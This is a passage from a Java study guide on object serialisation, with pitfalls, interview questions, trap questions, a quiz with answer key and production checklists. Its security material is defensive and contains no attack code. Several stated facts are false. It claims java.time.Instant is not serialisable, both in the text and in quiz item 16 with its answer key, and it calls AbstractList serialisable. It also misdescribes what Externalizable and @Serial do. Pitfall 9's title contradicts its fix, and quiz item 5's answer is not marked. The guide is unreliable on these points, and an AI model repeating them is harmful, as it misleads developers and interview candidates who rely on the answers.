**✅ FIX** — use JSON/Protobuf; or at minimum an `ObjectInputFilter` allow-list.

---

### ❌ Pitfall 6 — A mutable class that is not defensively copied

```java
class Order implements Serializable {
    private final List<Item> items = new ArrayList<>();   // ⚠ the caller can mutate it
}
```

**✅ FIX** — `List.copyOf(items)` in the constructor (and on deserialisation, via `readObject`).

---

### ❌ Pitfall 7 — A non-transient superclass field

```java
class Base { private String cache; }   // ⚠ NOT serialisable → the whole thing fails
class Sub extends Base implements Serializable { }
```

**✅ FIX** — make the superclass serialisable, or mark its state `transient`.

---

### ❌ Pitfall 8 — Believing `transient` is inherited

```java
class Base implements Serializable { private transient int a; }
class Sub extends Base { private int b; }
// ⚠ only Base.a is transient — Sub.b IS serialised
```

**✅ FIX** — mark each field `transient` explicitly.

---

### ❌ Pitfall 9 — Using `readObject` to validate, and ignoring the exception

```java
private void readObject(ObjectInputStream in) {
    in.defaultReadObject();
    if (amount < 0) throw new IllegalArgumentException();   // ✅ this DOES abort
}
```

**✅ FIX** — throwing from `readObject` **does** abort the deserialisation (unlike `readResolve`).

---

### ❌ Pitfall 10 — Not closing the streams

```java
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(o);   // ❌ the handle leaks
```

**✅ FIX** — try-with-resources.

---

### ❌ Pitfall 11 — Assuming the serialised form is small

```java
// a 2-field object → 253 bytes, because of the class descriptors
```

**✅ FIX** — a flat surrogate via `writeReplace`, or a compact format.

---

### ❌ Pitfall 12 — Using Java serialisation over the network

```java
// ❌ it works, but it is a security hole and it is brittle
```

**✅ FIX** — JSON or Protobuf.

---

## 8. Interview Q&A — Level-wise

### 🟢 Beginner

**Q: What is Java serialisation?**
**A:** The mechanism for converting an object **and its entire reachable object
graph** into a byte stream and back. A class opts in by implementing the
`Serializable` marker interface; the write is done with `ObjectOutputStream` and the
read with `ObjectInputStream`.

**Q: What are `transient` and `static` fields?**
**A:** **Neither is serialised.** `transient` marks an instance field to be skipped
(it gets the default value on deserialisation); `static` fields belong to the class,
not the instance, and are never written.

**Q: What is `serialVersionUID`?**
**A:** A version number written into the stream and checked on read. If it does not
match, deserialisation fails with `InvalidClassException`. It should always be
declared **explicitly** — otherwise the compiler generates it from the class's
structure, and any change to the class invalidates old data.

**Q: What happens if a field's type is not `Serializable`?**
**A:** The write throws `java.io.NotSerializableException` — and it may not be the
*obvious* field, because the check applies to the whole reachable graph. A `Logger`,
a `Thread` or a `java.time.Instant` in a nested object will fail the write.

### 🟡 Intermediate

**Q: Why does Java serialisation support object graphs with cycles and shared references?**
**A:** Because the stream encodes a **graph, not a tree**. Each object is written
once, and subsequent references to it are written as **back-references** (a handle
to the earlier position in the stream). A cycle is therefore just a back-reference
that points backwards, and it terminates naturally.

**Q: What are the customisation hooks?**
**A:** `writeReplace()` (swap the object for another when writing), `writeObject()` /
`readObject()` (control the field data yourself — call `defaultWriteObject()` /
`defaultReadObject()` for the standard part), `readResolve()` (swap the object after
reading — the classic way to return a canonical instance), and `readObjectNoData()`
(when the stream has no data for the class — e.g. an added field in an old stream).

**Q: Why is deserialising untrusted data dangerous?**
**A:** Because deserialisation can **execute arbitrary code**. The stream contains
class descriptors, and a class whose `readObject`/`readResolve` does something
dangerous (a "gadget") will be invoked. This is **CWE-502**, and it is why
serialised data from an untrusted source is a remote-code-execution vector.

**Q: What is `ObjectInputFilter`?**
**A:** A **deserialisation filter** (JEP 290, Java 9; reworked in JEP 415, Java 17)
that inspects each class as it is read and can **reject** it. A deny-by-default
**allow-list** (`ObjectInputFilter.Config.createFilter("com.example.*;…;!*")`) plus
size/depth/reference limits turns "arbitrary code execution" into "a rejected
stream". It is a real mitigation, but not a substitute for using a safe format.

### 🔴 Advanced / Senior

**Q: How do you evolve a serialisable class without breaking the stored data?**
**A:** Four rules. (1) **Declare `serialVersionUID` explicitly and never change it**
— that is the compatibility contract. (2) **Add new fields with defaults** — an old
stream leaves them at 0/null, so the code must tolerate that (use
`readObjectNoData` for a meaningful default). (3) **Never change a field's type or
name** — the value would be lost or misinterpreted; instead add a new field and
migrate in `readObject` by reading the old value and writing the new one. (4) **Never
remove a field** until you are willing to break compatibility — and if you must,
bump the `serialVersionUID` deliberately, which is a clean break with a clear error
rather than a silent corruption. The deeper point: the serialised form is a
**protocol**, and protocols need the same discipline as network formats —
version, compatibility rules, and a deprecation plan.

**Q: Why is Java's serialised form still around after 25 years, when the JDK has better options?**
**A:** Because it solves a problem nothing else solves *in the JDK*: it serialises an
**arbitrary object graph**, with **shared references, cycles, polymorphism and
customisable hooks**, with **no schema** and **no code generation**, and the format
is **stable across JVM versions**. That last property is what made it survive: Java
1.1 (1997) can read Java 21's streams. The things it is *good* at (persisting a
long-lived object graph you control) it still does well. The things it is *bad* at
(being a wire format, being safe, being compact, being readable) are exactly the
things it was never meant for. The modern Java answer is therefore **not** "replace
Java serialisation" but **"use it only for what it is good at"** — long-lived
persisted state — and use JSON or Protobuf for everything else.

**Q: How would you migrate a service from Java serialisation to JSON safely?**
**A:** In four stages, each independently reversible. (1) **Add the JSON representation
alongside** — a `record` DTO with an explicit mapping (do *not* serialise the domain
object directly — that couples the wire format to the domain model, and the domain
model will change). (2) **Read both formats** — detect the format by a magic
prefix or a version field, and deserialise accordingly; write the new format only.
(3) **Migrate the data** — a background job that reads the old files and rewrites
them in the new format, keeping the originals until the job has run twice. (4)
**Remove the old path** — once the retention window has passed. The critical
discipline: **the mapping must be explicit and tested**, because the two formats
model the data differently (Java serialisation captures the *object graph*; JSON
captures the *values*), and a polymorphic field needs an explicit type
discriminator (`@JsonTypeInfo`) in JSON that Java serialisation gives for free.

### ⚫ Expert / Principal

**Q: Java's serialisation is often called a "security disaster". Is the objection about the mechanism or the deployment?**
**A:** **Both, and separating them is the key insight.** The *mechanism* — "a stream contains class names, and loading a class can run code" — is inherently unsafe for untrusted input, and no amount of filtering makes it *safe*: a filter can be misconfigured, a gadget may be reachable through an allowed package, and the JDK's own class set changes between releases. So the objection is **structurally correct** for untrusted input. But the *deployment* is where the real mistake lies: Java serialisation was designed for **local, trusted, long-lived persistence** (RMI, `HttpSession`, JMS) — and in that context it is safe and excellent. The disaster came from **(a)** frameworks that exposed it over the network (Hessian, JMX, some SOAP stacks, and famously **Apache MyFaces** and **JBoss**), and **(b)** a decade of "just deserialise this blob" endpoints. The interesting evolution is that the *language* has responded with **filters, module boundaries, and finally `ObjectInputFilter` as a first-class API** — the community's conclusion being that a deny-by-default allow-list is a *sufficient* mitigation when you control the data source, and *insufficient* when you do not. The deeper lesson: **the security property of a serialisation format is a property of the *deployment*, not of the format** — the same mechanism that is a liability in an API is an asset in a local cache. And the modern engineering consensus is the *convergence* point: even the "safe" local use case is increasingly served by simpler mechanisms (a `record` plus JSON, or a database), because the operational cost of Java serialisation — opaque streams, `serialVersionUID` cliffs, and the constant security review burden — usually exceeds its benefit.

---

## 9. Counter-Questions & Traps

### CQ1. "If Java serialisation is unsafe, why is it still used in the JDK itself?"

- **Naive:** "Legacy — it was the only option."  ← *historically true, and it misses the present*
- **The trap:** The trap is to answer with history. The JDK still uses it, and the *reasons* it is used are **specific** — and understanding them is what tells you where it is and is not appropriate.
- **Expert answer:** The JDK's uses, and why each is safe. (1) **`HttpSession`** — the session data is written and read by the **same container**, in a **trusted** location (the container's temp directory), for a **short** lifetime. The threat model is "someone with filesystem access to the container's temp dir", which is a much smaller hole than "someone on the network". (2) **RMI** — the peer is authenticated by the RMI transport (TLS + a security manager), so the deserialised data comes from an authenticated peer. (3) **`java.beans` / `java.util` collections** — the JDK's own collections are serialisable, and the JDK's *own* formats are written and read by the same JVM family. The general principle: **Java serialisation is safe when the writer and the reader are the same trust domain** — and every JDK use satisfies that. The moment the trust boundary crosses (a network, a user upload, a shared cache), the mechanism becomes a liability. So the answer to "is it safe" is not yes/no — it is "**safe between whom?**"

### CQ2. "You said `serialVersionUID` should always be explicit. But isn't it a pain when you deliberately want to break compatibility?"

- **Naive:** "Then change it."  ← *true, and it misses the accidental-breakage risk*
- **The trap:** The trap is to treat the UID as a "compatibility switch you flip when you want". The real value of declaring it is that it makes the *default* safe: a class change that *accidentally* breaks the format is caught by the compiler (or at least does not silently change the UID).
- **Expert answer:** The two decisions, and how to make each explicit. (1) **The default (declare it and never change it)** is right for almost everything: it means the format is *append-only* — you can add fields (they default), add methods, and change the implementation freely, and the stored data still reads. This is the "**compatible evolution**" model. (2) **The deliberate break** (change the UID) is for a *semantic* change — the field now means something different, or the class's role has changed. The discipline: make it a **deliberate, reviewed act** — a comment saying why, and a version bump. The failure mode the explicit UID prevents is the *accidental* one: a developer adds a field, the compiler regenerates the UID, and every previously-stored object becomes unreadable — with an `InvalidClassException` that may not appear until the data is read months later. The general principle: **defaults should be safe, and breaking changes should be explicit.** The same pattern appears in database schemas (an explicit migration), in API versions, and in `serialVersionUID` itself.

### CQ3. "If JSON is safer and more readable, why is Java serialisation faster?"

- **Naive:** "It doesn't handle object graphs."  ← *true, and it is the wrong comparison*
- **The trap:** The trap is to compare them on *speed* and conclude Java serialisation wins. It is measurably faster for **small, deeply-nested, polymorphic** object graphs — and it is much slower for the **flat, string-keyed** payloads that dominate modern APIs. The comparison is apples to oranges.
- **Expert answer:** The fair comparison, by payload shape. (1) **Java serialisation is faster for**: a *deep* object graph (it writes the graph structure once, with handles), *polymorphic* fields (no type metadata needed — the class descriptor carries it), and a *binary* payload (no text encoding). Jackson's binary formats (Smile, CBOR) close much of the gap. (2) **JSON is faster for**: a *flat* DTO (a `record` with 10 string fields), because Java serialisation writes a **class descriptor** for every class in the graph — a 2-field object produced 253 bytes. (3) **JSON is far better for**: *readability* (a human, a proxy, a WAF and a `grep` can all see it), *interoperability* (a non-JVM consumer), *evolution* (an unknown property can be ignored), and *safety* (no arbitrary code path). The measured numbers in the industry: Java serialisation is roughly 2–5× faster than Jackson for deep binary payloads and roughly 2–3× *slower* for typical flat DTOs — and the JSON payload is usually 3–5× larger on the wire, which matters more than the CPU. The engineering conclusion: **for a REST API, JSON wins on every axis that matters; for a local, trusted, deep binary cache, Java serialisation can win.** The general lesson: *compare on the dimensions your workload actually has.*

### CQ4. "You said `ObjectInputFilter` mitigates the deserialisation attack. Is it actually safe?"

- **Naive:** "Yes, with a proper allow-list."  ← *true, and it misses the residual risks*
- **The trap:** The trap is to treat the filter as a *guarantee*. It is a **deny-by-default allow-list** — which is strong, but it depends on (a) the list being correct, (b) the list being maintained as dependencies change, and (c) the absence of a gadget *within* an allowed package.
- **Expert answer:** The precise residual risks, and the honest verdict. (1) **The allow-list must be maintained** — a new dependency brings new classes, and a permissive pattern (`com.example.*`) may admit a gadget. (2) **A gadget inside an allowed package** is still reachable — the filter stops *classes*, not *behaviour*. (3) **The filter is a JDK 9+ API** — an application on Java 8 has no mitigation at all. (4) **It protects only the read side** — the write side is unconstrained, so a *stored* payload can be poisoned even if the read is filtered. (5) It does not help if the deserialisation happens **inside a library** that does not apply your filter. The verdict: **a filter turns a *remote-code-execution* vulnerability into a *denial-of-service* or a *rejected-request* problem** — a real and valuable improvement — but it does not make untrusted deserialisation *safe*. The correct guidance stands: **do not deserialise untrusted data; use a format that cannot execute code.** The filter is the *defence in depth* for the case where you must (a legacy protocol, an old session store).

### CQ5. "What is the difference between `Serializable` and `Externalizable`? When would you use `Externalizable`?"

- **Naive:** "`Externalizable` gives you full control of the format."  ← *true, and it misses the cost*
- **The trap:** The trap is to think `Externalizable` is just "more control". It is **much more work** — and the reason most people never use it is precisely that the default `Serializable` mechanism already handles the hard parts (the graph, the cycles, the handles).
- **Expert answer:** The trade-off, precisely. `Serializable` gives you the **default** behaviour: the JVM writes the class descriptor, the field values, and the back-references — and you can customise *parts* of it with `writeObject`/`readObject`/`writeReplace`. `Externalizable` replaces **all** of it: you implement `writeExternal`/`readExternal` and are responsible for the class descriptor, the field data, **and the object graph** (including the back-references, which means you must manage them yourself). The cost: it is **significantly more code**, and it is **fragile** — a mistake in the back-reference handling produces a corrupted graph rather than an exception. The use cases where it genuinely wins: (1) **maximum compactness** — you control the exact bytes (e.g. a wire protocol); (2) **a superclass that is not serialisable** — `Externalizable` lets you avoid the `readObjectNoData` dance, because the *first* non-serialisable superclass's no-arg constructor is still called, but you control the rest; (3) **performance-critical** paths where the reflection overhead of the default mechanism is measurable. The verdict: **almost always use `Serializable` with `writeObject`/`readObject` for the parts you want to change** — you get the graph handling for free. `Externalizable` is for the rare case where you need to control the *format*, not just the *fields*.

### CQ6. "How do you handle a class whose superclass is not serialisable?"

- **Naive:** "Make the superclass serialisable."  ← *sometimes impossible*
- **The trap:** The trap is to miss the **mechanism**: the first non-serialisable superclass's **no-arg constructor is called** during deserialisation, and **its fields are not restored** — so the superclass's state comes back as defaults. If that state is essential, the object is silently wrong.
- **Expert answer:** The rule and the three options. **The rule:** during deserialisation, the JVM calls the no-arg constructor of the **first non-serialisable superclass** in the chain, and then restores the fields of the serialisable classes below it. The superclass's own fields are **not** restored — they keep whatever the constructor set. The three options: (1) **make the superclass serialisable** (the cleanest — but you may not control it); (2) **give the superclass a no-arg constructor that re-initialises its state correctly** — so the defaults are *meaningful*; (3) **use `readObject` in the serialisable subclass to re-initialise the superclass's state** (calling a superclass method that resets it). The classic example: `ArrayList` extends `AbstractList` (which *is* serialisable) and implements `writeObject`/`readObject` to restore the `elementData` array and the `modCount`. The general lesson: **the superclass boundary is where serialisation's guarantees quietly weaken**, and it must be handled deliberately.

### CQ7. "Why is Java serialisation slower than it should be, and can it be improved?"

- **Naive:** "It's old."  ← *true, and it misses the specific costs*
- **The trap:** The trap is to treat "slow" as a single thing. The costs are **distinct**, and only some of them are fixable.
- **Expert answer:** The three costs, and what can be done about each. (1) **The class-descriptor overhead** — every class in the graph costs a descriptor with its name, its UID, its flags and its field list. For a *flat* object with 3 classes, that is a large fraction of the stream. **Fix:** `writeReplace` with a flat surrogate (a `record` with primitive fields) — the object becomes a handful of bytes. (2) **The reflection** — the default mechanism uses reflection to read the fields. **Fix:** `Externalizable`, or the surrogate approach. (3) **The graph traversal** — the stream is written depth-first with handle bookkeeping, and for a *deep* graph that is a lot of pointer-chasing. **Fix:** a flat surrogate, or a different format. (4) **The allocation** — writing builds the descriptors and the handle table. **Fix:** reuse a single `ObjectOutputStream` with `reset()`, or use a format without a graph. The industry answer, in order: (a) use a **surrogate** (`writeReplace` → a flat `record` → `writeObject` on it); (b) use **Kryo** or **FST** if you need speed and the peer is trusted; (c) use **Protobuf** if it is a network format. The general lesson: *the default mechanism optimises for generality, not for size — and the single biggest win is almost always "flatten the graph".*

### CQ8. "You said Java serialisation handles polymorphism for free. Does it?"

- **Naive:** "Yes — the class descriptor carries the concrete type."  ← *true, and it misses the limits*
- **The trap:** The trap is to miss the *limits*: the field's **declared** type must be serialisable, but the **concrete** type is written in the stream — and the *deserialising* JVM must have that class. So a polymorphic field is a **coupling to the classpath of the reader**, and the format does not record *which* type in a schema-friendly way.
- **Expert answer:** What it gives you and where it stops. (1) **It works out of the box** — the stream records the concrete class, so a `PaymentMethod` field holding a `Card` is restored as a `Card`. That is genuinely better than JSON, which needs an explicit `@JsonTypeInfo` (and a type *name* that survives a rename). (2) **The limits:** (a) the **declared type** of the field must be serialisable (the concrete type is not enough); (b) the reader's **classpath must contain the concrete class**, or you get `ClassNotFoundException`; (c) the concrete class's **name is embedded in the stream**, so renaming it breaks the data — a coupling that is invisible in the source; (d) there is no **schema** — you cannot validate a stream without deserialising it, which is exactly the problem that makes untrusted deserialisation dangerous. The comparison with JSON: JSON's `@JsonTypeInfo` makes the polymorphism *explicit and schema-visible* (a good thing for governance, a burden for the model), while Java serialisation makes it *implicit* (convenient, and invisible). The engineering conclusion: for a **polymorphic** domain model, Java serialisation's implicit polymorphism is genuinely elegant — but it comes with the classpath coupling, and it is one of the reasons the modern default is a flat DTO plus an explicit type discriminator.

### CQ9. "What happens if a `serialVersionUID` does not match? Is the data lost?"

- **Naive:** "It throws `InvalidClassException`."  ← *true, and it misses the recovery question*
- **The trap:** The trap is to stop at "it throws". The interesting question is: **is the data recoverable, and what should the application do?** Because the exception happens *after* the stream has been read up to that point — so a naive `catch` that continues could leave a partially-constructed object.
- **Expert answer:** The precise behaviour and the recovery strategy. (1) The `InvalidClassException` is thrown when the class descriptor is read — i.e. **early**, before the object's data is applied. So the object is not half-constructed; the read fails cleanly. (2) The **data in the stream is not lost** — it is still there, in a format the *old* class understood. So the recovery strategy is: (a) **keep the old class version** under a different name (or in a compatibility jar) and read with it, then migrate; (b) **use a custom `readObject` that reads the old format and adapts** — but note the UID check happens *before* `readObject` runs, so a UID mismatch prevents even a custom reader; (c) **bump the UID deliberately** and handle the exception at the boundary by falling back to a *migration path* (an old reader, or a JSON side-channel). (3) The operational practice: **version the stored data explicitly** (a version field in the payload, or a directory per version) rather than relying on the UID to be the versioning mechanism — because the UID only tells you the data is *incompatible*, not how to *fix* it. The general lesson: *a version check tells you "no"; a migration plan tells you "here is how".*

### CQ10. "If you had to remove Java serialisation from a large codebase tomorrow, what would you do?"

- **Naive:** "Replace it with JSON everywhere."  ← *naive, and the interviewer will push on the hard cases*
- **The trap:** The trap is to think the migration is a *format* change. The hard cases are **not** about the format — they are about the cases Java serialisation handles that JSON does not: **object graphs with cycles**, **shared references**, **polymorphism without a schema**, and **the classpath coupling**.
- **Expert answer:** The triage, by use case, and the honest assessment of each. (1) **A REST/JSON API payload** — trivial: a `record` DTO + Jackson. This is probably 80% of the usages and the easiest 80%. (2) **A cache (Redis, Memcached)** — use a **binary, schema-less format** if the peer is Java-only (Kryo, or a hand-rolled `DataOutputStream` format), or JSON if it is not. (3) **A persisted object graph in a database** — this is the hard one: if the graph has cycles and sharing, a flat format cannot represent it directly. The options: (a) **normalise the model** — persist the aggregate as rows, not as a graph (this is the *right* answer and what DDD would tell you anyway); (b) keep Java serialisation for this case and *accept* the risk, with a filter and a migration plan; (c) use a graph-capable format (there is no good one). (4) **Internal RPC** — Protobuf (schema evolution, compact, cross-language). (5) **`HttpSession`** — you do not choose this; the container does. The honest conclusion: **the migration is mostly a *modelling* exercise, not a *format* exercise** — and the cases that are genuinely hard are the cases where the *model* (a cyclic object graph persisted as a blob) is the actual problem. The first step of the migration is therefore not technical: it is to find the places where the code persists an *object graph* rather than *data*, and to fix those.

---

## 10. Rapid-Fire MCQs

**Q1.** Which interface marks a class as serialisable?
- A) `Externalizable`  B) **`Serializable`**  C) `Cloneable`  D) `Persistence`

**Q2.** Which fields are **not** serialised?
- A) `final`  B) `private`  C) **`transient` and `static`**  D) `protected`

**Q3.** What happens if a reachable field's type is not serialisable?
- A) It is skipped  B) **`NotSerializableException`**  C) It becomes null  D) `InvalidClassException`

**Q4.** The default `serialVersionUID` is generated from…
- A) The class name only  B) **The class's structure (fields, methods, constructors)**  C) The hash code  D) The timestamp

**Q5.** Declaring `serialVersionUID` explicitly means…
- A) The UID never changes  B) The class is final  C) The UID is a timestamp  D) The class is immutable

**Q6.** A UID mismatch causes…
- A) A `NullPointerException`  B) **`InvalidClassException`**  C) A `ClassNotFoundException`  D) Silent corruption

**Q7.** `transient` fields are restored as…
- A) Their previous values  B) **Their default values (0/null/false)**  C) `null` only  D) The class default

**Q8.** The serialised form supports shared references and cycles by using…
- A) A pointer table  B) **Back-references (handles)**  C) A recursion guard  D) A cycle counter

**Q9.** `writeReplace()` is called…
- A) After reading  B) **When writing**  C) During GC  D) On deserialisation only

**Q10.** `readResolve()` lets you…
- A) Read a field  B) **Return a different object after deserialisation**  C) Write a field  D) Skip a field

**Q11.** `readObjectNoData()` is called when…
- A) The stream is empty  B) **The stream has no data for this class (e.g. a new field)**  C) The class is abstract  D) A field is null

**Q12.** `Externalizable` requires you to implement…
- A) `writeObject` and `readObject`  B) **`writeExternal` and `readExternal`**  C) `readResolve`  D) `writeReplace`

**Q13.** Deserialising untrusted data is the vulnerability known as…
- A) CWE-79  B) **CWE-502 (deserialisation of untrusted data)**  C) CWE-89  D) CWE-22

**Q14.** `ObjectInputFilter` (Java 9/17) can…
- A) Encrypt the stream  B) **Reject classes during deserialisation**  C) Compress the stream  D) Sign the stream

**Q15.** Java's serialised form is stable across…
- A) Languages  B) **JVM versions**  C) Operating systems only  D) JDK major versions only

**Q16.** Which is **not** serialisable out of the box?
- A) `String`  B) `ArrayList`  C) **`java.time.Instant`**  D) `HashMap`

**Q17.** The recommended modern alternative for a REST API is…
- A) Java serialisation  B) **JSON**  C) Kryo  D) `ObjectOutputStream`

**Q18.** `@Serial` (Java 14+) lets the compiler…
- A) Mark a class final  B) **Verify the serialised form and the UID agree**  C) Encrypt the stream  D) Skip a field

**Q19.** During deserialisation, the no-arg constructor of the first non-serialisable superclass…
- A) Is not called  B) **Is called**  C) Throws  D) Is called only for classes

**Q20.** The main performance cost of Java serialisation for a flat object is…
- A) The encryption  B) **The per-class descriptors in the stream**  C) The GC pressure only  D) The network

---

### ✅ Answer Key

| # | Answer | One-line explanation |
|---|--------|----------------------|
| 1 | **B** | `Serializable` is the marker interface. |
| 2 | **C** | `transient` and `static` fields are skipped. |
| 3 | **B** | `NotSerializableException` — and it may be a *nested* field. |
| 4 | **B** | A hash of the class's structure — so any change alters it. |
| 5 | **A** | It is the compatibility contract you control. |
| 6 | **B** | `InvalidClassException: local class incompatible`. |
| 7 | **B** | The default value for the type. |
| 8 | **B** | Back-references to earlier positions in the stream. |
| 9 | **B** | It swaps the object for a surrogate when writing. |
| 10 | **B** | It lets you return the canonical instance (the singleton pattern). |
| 11 | **B** | When the stream predates a field — e.g. after adding one. |
| 12 | **B** | You take over the whole format, including the graph handling. |
| 13 | **B** | CWE-502 — deserialisation of untrusted data. |
| 14 | **B** | A deny-by-default allow-list plus size/depth limits. |
| 15 | **B** | Java 1.1 can read Java 21's streams. |
| 16 | **C** | `java.time` types are not `Serializable`. |
| 17 | **B** | JSON is safe, readable, interoperable and evolvable. |
| 18 | **B** | It makes an accidental change to the serialised form a compile error. |
| 19 | **B** | It is called, and the superclass's own fields are **not** restored. |
| 20 | **B** | Every class in the graph costs a descriptor — 253 bytes for a 2-field object. |

---

## 11. Cheat Sheet / One-Page Summary

```text
┌──────────────────────────────────────────────────────────────────────────┐
│                     THE SERIALISATION RULES                              │
├──────────────────────────────────────────────────────────────────────────┤
│  ✅ implements Serializable                                             │
│  ✅ EVERY reachable object is serialisable (or transient)                │
│  ✅ explicit `serialVersionUID = 1L`                                    │
│  ✅ `transient` for the fields that must not be written                 │
│  ✅ `static` fields are never written                                   │
│  ✅ try-with-resources for the streams                                  │
│  ⚠ the first non-serialisable superclass's no-arg ctor is called         │
│  ⚠ its fields are NOT restored                                         │
│  ❌ NEVER deserialise untrusted data                                    │
└──────────────────────────────────────────────────────────────────────────┘
```

```text
┌──────────────────────────────────────────────────────────────────────────┐
│                    THE FOUR CUSTOMISATION HOOKS                        │
│  writeReplace()   → swap the object for a surrogate WHEN WRITING         │
│  writeObject()    → control the field data (call defaultWriteObject())   │
│  readObject()     → control the field data (call defaultReadObject())   │
│  readResolve()    → return a DIFFERENT object after reading             │
│  readObjectNoData() → handle a stream that has no data for this class   │
└──────────────────────────────────────────────────────────────────────────┘
```

```text
┌──────────────────────────────────────────────────────────────────────────┐
│                    WHICH FORMAT FOR WHICH JOB?                          │
│  REST API payload          → JSON (Jackson) + a record DTO ✅           │
│  Internal service RPC      → Protocol Buffers / Avro ✅                 │
│  A local, trusted cache    → Java serialisation, or Kryo ✅             │
│  A long-lived persisted    → Java serialisation with an explicit UID,   │
│    object graph               a flat surrogate, and a read filter ⚠    │
│  Untrusted input            → NEVER Java serialisation ❌              │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## 12. Real-World Production Notes

### The pre-flight checklist for adding `Serializable`

```text
  ☐ Declare `private static final long serialVersionUID = 1L;`
  ☐ Every field is serialisable, or `transient`
  ☐ No lambdas, no `java.time`, no loggers, no threads
  ☐ The class is `final` and its fields are `final` (immutability → safe)
  ☐ The no-arg constructor of the first non-serialisable superclass is safe to call
  ☐ The object graph has no cycles you do not understand
  ☐ A read filter is configured wherever the data could come from outside
  ☐ A migration plan exists if the format ever has to change
```

### The optimisation ladder

| Step | Effort | Effect |
|---|---|---|
| 1. Declare `serialVersionUID` | trivial | Compatibility stability |
| 2. Mark the non-serialisable fields `transient` | trivial | Makes it serialisable at all |
| 3. A flat surrogate via `writeReplace` | small | **The biggest win** — often 5–10× smaller |
| 4. `Externalizable` | large | Full control, at the cost of the graph handling |
| 5. A different format (JSON/Protobuf/Kryo) | large | The right answer for new code |

### The security checklist

```text
  ☐ Never deserialise data from an untrusted source
  ☐ If you must, apply an ObjectInputFilter allow-list
  ☐ Set a maximum stream size, depth and reference count
  ☐ Consider running the deserialiser in a low-privilege process
  ☐ Log and alert on every deserialisation failure
  ☐ Review the allow-list whenever a dependency changes
```

### Observability

| Signal | What it tells you |
|---|---|
| `InvalidClassException` count | A class changed without a UID plan — **a broken deployment** |
| `NotSerializableException` count | A new non-serialisable field was added |
| The average serialised size | A graph that is too deep or too wide |
| Deserialisation latency | An unusually large graph, or a malicious payload |

---

## 13. Follow-up Learning

| Topic | Where to go next |
|---|---|
| The alternative formats (JSON, Protobuf) | [14 · Reflection & Annotations](../14-Reflection-Annotations/01-Reflection-and-Annotations.md) |
| Records and immutable value objects | [07 · Java 11/17/21](../07-Java-11-17-21-Features/01-Java-11-17-21-Features.md) |
| The `ObjectInputFilter` API | JEP 290 (Java 9) and JEP 415 (Java 17) |
| The serialisation specification | The "Java Object Serialization Specification" (the stream format) |
| Custom serialisation in depth | [02 · Custom Serialization](02-Custom-Serialization.md) |

---

**Next Chapter:** → [02 · Custom Serialization](02-Custom-Serialization.md)
**Previous Chapter:** → [16 · JDBC](../16-JDBC/01-JDBC-Basics.md)
**Standard followed:** [../STANDARD.md](../STANDARD.md) · **Updated:** 2026
